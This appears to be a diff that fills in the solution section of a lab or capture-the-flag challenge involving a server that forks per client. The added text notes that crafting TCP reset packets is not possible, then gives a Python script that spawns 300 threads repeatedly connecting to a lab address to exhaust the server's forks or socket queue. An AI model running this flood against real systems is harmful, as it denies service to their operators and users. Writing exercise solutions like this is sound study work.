@@ -13,4 +13,30 @@ This time the server forks a new process for each client connection, and limits 
 
 # Solution
 
-TODO
+1. know we dont have capability to craft and a TCP reset packet
+
+```python
+user_host.interactive(preexec_fn=lambda: limit_capabilities(0), environ=parent_process.environ())
+```
+
+2. Try to exhaust the server’s forks or socket queue
+
+```python
+import socket
+import time
+import threading
+
+def spam():
+    while True:
+        try:
+            s = socket.create_connection(("10.0.0.2", 31337), timeout=2)
+            time.sleep(2)
+            s.close()
+        except:
+            pass
+
+for _ in range(300):  # tweak based on system capacity
+    threading.Thread(target=spam, daemon=True).start()
+
+time.sleep(120)  # let it run long enough to disrupt
+```
